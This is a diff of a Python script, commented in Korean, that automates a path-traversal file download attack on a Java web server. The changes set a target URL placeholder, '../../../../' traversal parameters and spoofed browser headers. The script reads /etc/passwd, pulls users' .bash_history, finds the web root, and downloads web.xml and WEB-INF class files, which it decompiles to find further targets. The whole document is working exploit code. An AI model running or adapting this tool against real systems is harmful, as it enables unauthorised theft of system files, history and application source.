@@ -20,12 +20,12 @@ BASE_DIR.mkdir(parents=True, exist_ok=True)
 
 
 first_downloaded_file = []
-homeDir = "" # ex) /home/test
+homeDir = "/opt/tmax/" # ex) /home/test
 downloaded_class_list = []
 WebRoot = [] # ex) /storage/webapps/test/site
 
 # 다운로드 실패 시 0바이트가 아닌 문구 등 바이트 반환될때 고정 값 넣어주기
-download_Fail_byte = b""
+download_Fail_byte = b"history.back()"
 
 # class_file extract 
 IMPORT_PATTERN = re.compile(r"^import com")
@@ -50,6 +50,9 @@ def extract_account(passwd: Path) -> None:
                     bHistory = fields[5] + "/.bash_history"
 
                 bash_history = download_File(bHistory)
+
+                print("download file", bHistory)
+
                 if bash_history and (not download_Fail_byte or download_Fail_byte not in bash_history):
                     print("WAS was executed by " + account)
                     if fields[5] == "/":
@@ -96,7 +99,7 @@ def download_File(path: str) -> bytes:
     # return b"success Download"
 
     targetUrl_GET = ""
-    targetUrl_POST = ""
+    targetUrl_POST = "TARGET_URL"
 
     if targetUrl_GET:
         params = {
@@ -117,14 +120,16 @@ def download_File(path: str) -> bytes:
     elif targetUrl_POST:
         data = {
 
-            "file": path,
-            "path": "../../../"
+            "filename": "../../../../" + path,
 
         }
         headers = {
-            "Cookies": "JESSIONID"
+            "Cookie": "",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "User-Agent": "",
+            "Referer": ""
         }
-        response.post(url=targetUrl_POST, data=data)
+        response = requests.post(url=targetUrl_POST, data=data, headers=headers)
         first_downloaded_file.append(path)
         time.sleep(0.5)
         if len(response.content) == 0:
@@ -154,7 +159,7 @@ def download_web_xml():
             if result and (not download_Fail_byte or download_Fail_byte not in result):
                 mkFile(result, path)
 
-# 1차 파일 다운로드 수행 후 xml 파일 다 뒤져서 "classpath" 및 .xml 같은 내부 파일 탐지 및 2차 다운로드 시작 함수 
+# 1차 파일 다운로드 수행 후 xml 파일 탐색 후 내부 파일 탐지 및 2차 다운로드 시작 함수 
 def extract_download_path():
     for file in first_downloaded_file:
         if file.endswith('.xml'):
@@ -168,8 +173,11 @@ def extract_download_path():
 # passwd 방식 경우 .bash_history 해석 및 다운로드 함수
 def solve_Bash_History():
     relativeHomeDir = homeDir.lstrip("/")
-    with open(BASE_DIR / relativeHomeDir / ".bash_history", "r") as f:
+    filepath = BASE_DIR / relativeHomeDir / ".bash_history"
+    
+    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
         for line in f:
+            # 여기에 명령어 분석 로직
 
             find_WebRoot(line)
 
@@ -285,7 +293,7 @@ def extract_class(decompile_class: str) -> list[str]:
 # 파일 다운로드 함수 if you want POST method "targetUrl_GET = ''"
 def download_java_classes(classPath_list: list[str]):
     targetUrl_GET = ""
-    targetUrl_POST = ""
+    targetUrl_POST = "TARGET_URL"
     WEBROOT = WebRoot + "/WEB-INF/classes/"
     if targetUrl_GET:
         for classPath in classPath_list:
@@ -327,12 +335,11 @@ def download_java_classes(classPath_list: list[str]):
             download_java_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))
 
     elif targetUrl_POST:
-        for file_name in classPath_list:
+        for filename in classPath_list:
             
             # Customize Data
             data = {
-                "file_Name": file_name,
-                "file_Path": "../../../../",
+                "file_Name": filename,
             }
             # data = {
             #     "fileNm": file_name,
@@ -341,19 +348,18 @@ def download_java_classes(classPath_list: list[str]):
 
             # Customize Header
             headers = {
-                "User-Agent": "Mozilla/5.0",
-                "Accept": "*/*",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                 "Content-Type": "application/x-www-form-urlencoded",
-                "Cookie": "JSESSIONID=<session_id>",
-                "Referer": "https://example.com/",
-                "Origin": "https://example.com",
+                "Cookie": "",
+                "Accept-Encoding": "gzip, deflate, br",
             }
 
             response = requests.post(targetUrl_POST, data=data)
             if len(response.content) == 0:
                 continue
 
-            with open(file_name, "wb") as f:
+            with open(filename, "wb") as f:
                 downloaded_class_list.append(className)
                 f.write(response.content)
                 print("extract class : " + className)
@@ -371,9 +377,10 @@ def main():
 
     if args.passwd:
         print("extract file via passwd ...")
-        extract_account(Path(args.passwd))
-        download_HomeFile()
-        download_SystemFile()
+        # extract_account(Path(args.passwd))
+        # print("done extrace account")
+        # download_HomeFile()
+        # download_SystemFile()
         if homeDir != "":
             solve_Bash_History()
             download_web_xml()
